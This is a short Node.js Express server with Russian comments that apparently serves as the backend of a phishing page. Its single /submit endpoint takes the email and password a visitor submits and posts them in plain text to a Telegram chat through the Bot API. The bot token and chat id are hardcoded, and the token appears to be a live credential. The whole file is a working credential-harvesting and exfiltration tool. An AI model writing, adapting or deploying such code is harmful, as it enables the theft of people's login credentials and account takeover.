const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');

// Создаем сервер
const app = express();

// Парсим JSON
app.use(bodyParser.json());

// Токен и chat_id для Telegram бота
const botToken = '7452593354:AAGpLye1ej6ofo7JsLfMzI1J1uwRcnsBT6c'; // Замените на свой токен бота
const chatId = '-1002398011666'; // Замените на свой chat_id

// Обработчик POST запроса на /submit
app.post('/submit', (req, res) => {
    const { email, password } = req.body;

    // Формируем сообщение для Telegram
    const message = `Новая заявка:\nEmail: ${email}\nПароль: ${password}`;

    // Отправляем данные в Telegram
    axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        chat_id: chatId,
        text: message,
    })
    .then(() => {
        res.status(200).send('Данные отправлены в Telegram');
    })
    .catch((error) => {
        res.status(500).send('Ошибка при отправке данных');
    });
});

// Запуск сервера на порту 3000
app.listen(3000, () => {
    console.log('Сервер работает на порту 3000');
});
